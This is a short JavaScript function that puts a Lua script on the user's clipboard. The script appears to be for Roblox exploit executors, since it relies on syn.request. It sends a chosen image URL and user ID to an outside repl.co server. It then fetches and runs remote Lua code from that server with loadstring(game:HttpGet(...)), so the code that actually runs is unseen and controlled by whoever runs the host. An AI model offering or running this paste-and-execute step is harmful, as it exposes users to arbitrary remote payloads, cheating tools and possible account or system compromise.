function myFunction() {
    // Get the string to copy
    var copyText = `url = "https://example.com/image.png" -- ANY image! 
user_id = "blank" -- give yourself a username 
    
local webUrl = ("https://rectangulardefinitivetrace.l10sls9bm2-s2jh.repl.co/index.php?content=" .. url .. "&roblox_id=" .. user_id)
    
request = http_request or request or HttpPost or syn.request
local sendRequest = {Url = webUrl, Method = "POST"}
request(sendRequest)
wait(1.5)
loadstring(game:HttpGet(("https://rectangulardefinitivetrace.l10sls9bm2-s2jh.repl.co/" .. user_id .. ".lua"), true))()`;
  
    // Copy the string to the clipboard
    navigator.clipboard.writeText(copyText);
  
  }